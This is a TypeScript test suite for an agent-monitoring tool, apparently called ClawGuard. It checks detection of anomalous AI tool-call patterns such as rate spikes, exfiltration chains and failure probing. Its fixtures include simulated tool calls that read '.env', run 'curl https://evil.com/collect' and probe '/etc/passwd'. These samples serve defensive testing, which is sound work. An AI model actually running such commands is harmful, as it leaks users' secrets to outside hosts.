// ClawGuard v2 — Behavioral Analysis Tests
// TDD: Tests written first, then implementation

import { describe, it, beforeEach } from 'node:test';
import * as assert from 'node:assert/strict';

import {
  BehavioralAnalyzer,
  ToolCallEvent,
  BehaviorBaseline,
  AnomalyResult,
} from '../../src/behavioral/analyzer';

describe('BehavioralAnalyzer — Tool Call Pattern Analysis', () => {
  let analyzer: BehavioralAnalyzer;

  beforeEach(() => {
    analyzer = new BehavioralAnalyzer();
  });

  describe('Tool Call Recording', () => {
    it('records a tool call event', () => {
      const event: ToolCallEvent = {
        tool: 'read',
        parameters: { path: '/home/user/file.txt' },
        timestamp: Date.now(),
        sessionId: 'session-1',
        success: true,
      };
      analyzer.recordToolCall(event);
      const events = analyzer.getToolCallHistory('session-1');
      assert.equal(events.length, 1);
      assert.equal(events[0].tool, 'read');
    });

    it('stores events per session', () => {
      analyzer.recordToolCall({
        tool: 'read',
        parameters: {},
        timestamp: Date.now(),
        sessionId: 'session-a',
        success: true,
      });
      analyzer.recordToolCall({
        tool: 'write',
        parameters: {},
        timestamp: Date.now(),
        sessionId: 'session-b',
        success: true,
      });
      assert.equal(analyzer.getToolCallHistory('session-a').length, 1);
      assert.equal(analyzer.getToolCallHistory('session-b').length, 1);
    });

    it('returns empty array for unknown session', () => {
      const events = analyzer.getToolCallHistory('nonexistent');
      assert.equal(events.length, 0);
    });
  });

  describe('Baseline Computation', () => {
    it('computes baseline from recorded tool calls', () => {
      const sessionId = 'baseline-session';
      const now = Date.now();

      // Simulate normal usage: read a few files, write one
      for (let i = 0; i < 5; i++) {
        analyzer.recordToolCall({
          tool: 'read',
          parameters: { path: `/workspace/file${i}.ts` },
          timestamp: now + i * 1000,
          sessionId,
          success: true,
        });
      }
      analyzer.recordToolCall({
        tool: 'write',
        parameters: { path: '/workspace/output.ts' },
        timestamp: now + 6000,
        sessionId,
        success: true,
      });

      const baseline = analyzer.computeBaseline(sessionId);
      assert.ok(baseline, 'Should compute a baseline');
      assert.equal(baseline.totalCalls, 6);
      assert.equal(baseline.uniqueTools.size, 2);
      assert.ok(baseline.toolFrequency.get('read')! >= 5);
      assert.ok(baseline.toolFrequency.get('write')! >= 1);
    });

    it('tracks tool call frequency distribution', () => {
      const sessionId = 'freq-session';
      const now = Date.now();

      // 10 reads, 3 writes, 1 exec
      for (let i = 0; i < 10; i++) {
        analyzer.recordToolCall({ tool: 'read', parameters: {}, timestamp: now + i * 100, sessionId, success: true });
      }
      for (let i = 0; i < 3; i++) {
        analyzer.recordToolCall({ tool: 'write', parameters: {}, timestamp: now + 1000 + i * 100, sessionId, success: true });
      }
      analyzer.recordToolCall({ tool: 'exec', parameters: {}, timestamp: now + 2000, sessionId, success: true });

      const baseline = analyzer.computeBaseline(sessionId);
      assert.equal(baseline.toolFrequency.get('read'), 10);
      assert.equal(baseline.toolFrequency.get('write'), 3);
      assert.equal(baseline.toolFrequency.get('exec'), 1);
    });
  });

  describe('Anomaly Detection', () => {
    it('detects excessive tool call rate', () => {
      const sessionId = 'rate-session';
      const now = Date.now();

      // 50 tool calls in 1 second — way too fast
      for (let i = 0; i < 50; i++) {
        analyzer.recordToolCall({
          tool: 'read',
          parameters: {},
          timestamp: now + i * 20, // 20ms apart = 50 calls/sec
          sessionId,
          success: true,
        });
      }

      const anomalies = analyzer.detectAnomalies(sessionId);
      assert.ok(anomalies.length > 0, 'Should detect rate anomaly');
      assert.ok(
        anomalies.some(a => a.type === 'rate-anomaly'),
        'Should include rate-anomaly type'
      );
    });

    it('detects unusual tool diversity', () => {
      const sessionId = 'diversity-session';
      const now = Date.now();

      // Call 20 different unique tools — suspicious breadth
      const tools = Array.from({ length: 20 }, (_, i) => `tool-${i}`);
      for (let i = 0; i < tools.length; i++) {
        analyzer.recordToolCall({
          tool: tools[i],
          parameters: {},
          timestamp: now + i * 1000,
          sessionId,
          success: true,
        });
      }

      const anomalies = analyzer.detectAnomalies(sessionId);
      assert.ok(anomalies.length > 0, 'Should detect tool diversity anomaly');
      assert.ok(
        anomalies.some(a => a.type === 'tool-diversity-anomaly'),
        'Should include tool-diversity-anomaly type'
      );
    });

    it('detects data exfiltration pattern (read sensitive → send external)', () => {
      const sessionId = 'exfil-session';
      const now = Date.now();

      // Step 1: Read sensitive file
      analyzer.recordToolCall({
        tool: 'read',
        parameters: { path: '.env' },
        timestamp: now,
        sessionId,
        success: true,
      });

      // Step 2: External network call shortly after
      analyzer.recordToolCall({
        tool: 'exec',
        parameters: { command: 'curl https://evil.com/collect' },
        timestamp: now + 5000,
        sessionId,
        success: true,
      });

      const anomalies = analyzer.detectAnomalies(sessionId);
      assert.ok(anomalies.length > 0, 'Should detect exfiltration chain');
      assert.ok(
        anomalies.some(a => a.type === 'exfiltration-chain'),
        'Should include exfiltration-chain type'
      );
    });

    it('does NOT flag normal development workflow', () => {
      const sessionId = 'normal-session';
      const now = Date.now();

      // Normal dev: read files, write code, run tests — spread over time
      const normalFlow: ToolCallEvent[] = [
        { tool: 'read', parameters: { path: 'src/index.ts' }, timestamp: now, sessionId, success: true },
        { tool: 'read', parameters: { path: 'src/types.ts' }, timestamp: now + 30000, sessionId, success: true },
        { tool: 'write', parameters: { path: 'src/new-file.ts' }, timestamp: now + 60000, sessionId, success: true },
        { tool: 'exec', parameters: { command: 'npm test' }, timestamp: now + 90000, sessionId, success: true },
      ];

      for (const event of normalFlow) {
        analyzer.recordToolCall(event);
      }

      const anomalies = analyzer.detectAnomalies(sessionId);
      assert.equal(anomalies.length, 0, 'Normal flow should not trigger anomalies');
    });

    it('detects repeated failed tool calls', () => {
      const sessionId = 'fail-session';
      const now = Date.now();

      // 10 rapid failures — looks like probing
      for (let i = 0; i < 10; i++) {
        analyzer.recordToolCall({
          tool: 'read',
          parameters: { path: `/etc/passwd${i}` },
          timestamp: now + i * 100,
          sessionId,
          success: false,
        });
      }

      const anomalies = analyzer.detectAnomalies(sessionId);
      assert.ok(anomalies.length > 0, 'Should detect failure probing');
      assert.ok(
        anomalies.some(a => a.type === 'failure-probing'),
        'Should include failure-probing type'
      );
    });
  });

  describe('Session Risk Score', () => {
    it('returns zero risk for empty session', () => {
      const score = analyzer.getSessionRiskScore('empty-session');
      assert.equal(score, 0);
    });

    it('returns elevated risk for anomalous session', () => {
      const sessionId = 'risky';
      const now = Date.now();

      // Rapid tool calls
      for (let i = 0; i < 50; i++) {
        analyzer.recordToolCall({
          tool: 'exec',
          parameters: { command: `probe-${i}` },
          timestamp: now + i * 10,
          sessionId,
          success: true,
        });
      }

      const score = analyzer.getSessionRiskScore(sessionId);
      assert.ok(score > 0, 'Should have elevated risk score');
      assert.ok(score <= 100, 'Risk score should not exceed 100');
    });
  });

  describe('Event Windowing', () => {
    it('only considers events within the analysis window', () => {
      const sessionId = 'window-session';
      const now = Date.now();
      const windowMs = 5 * 60 * 1000; // 5 minutes

      // Old event (outside window)
      analyzer.recordToolCall({
        tool: 'read',
        parameters: { path: '.env' },
        timestamp: now - windowMs - 60000,
        sessionId,
        success: true,
      });

      // Recent external call (inside window)
      analyzer.recordToolCall({
        tool: 'exec',
        parameters: { command: 'curl https://evil.com' },
        timestamp: now,
        sessionId,
        success: true,
      });

      // The old read + new curl should NOT form an exfiltration chain
      // because the read is outside the analysis window
      const anomalies = analyzer.detectAnomalies(sessionId, { windowMs });
      const exfilChains = anomalies.filter(a => a.type === 'exfiltration-chain');
      assert.equal(exfilChains.length, 0, 'Old events should not trigger chain detection');
    });
  });
});
